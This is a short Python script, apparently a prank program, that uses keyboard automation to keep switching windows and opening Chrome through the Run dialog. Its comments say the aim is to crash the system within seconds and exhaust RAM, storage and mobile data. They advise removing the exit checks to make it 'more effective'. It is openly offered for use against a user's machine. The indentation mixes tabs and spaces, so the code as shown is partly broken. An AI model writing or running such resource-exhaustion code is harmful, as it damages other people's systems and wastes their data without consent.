# Keyboard program to annoy a user by switching the windows tabs and opening chrome tabs.
# This would eventually crash the system within seconds.
# Will eat up all the RAM, STORAGE ADN IF POSSIBLE DATA.
# To consume data connection, you may try to run youtube video or some sort of download that gets downloaded everytime a browser opens.
# Make it more effective by Removing the break commands.

import keyboard

while True:
	if keyboard.is_pressed('z'):
		break
	if keyboard.read_key():
		keyboard.press_and_release('alt+tab')
        
    keyboard.press_and_release('win+R')
    keyboard.write('chrome')
    keyboard.press('enter')
    if keyboard.is_pressed('ctrl'):
        break
    if keyboard.is_pressed('1'):
        break
    if keyboard.is_pressed('esc'):
        break 
print("Annonying Ended Bye!!")                  
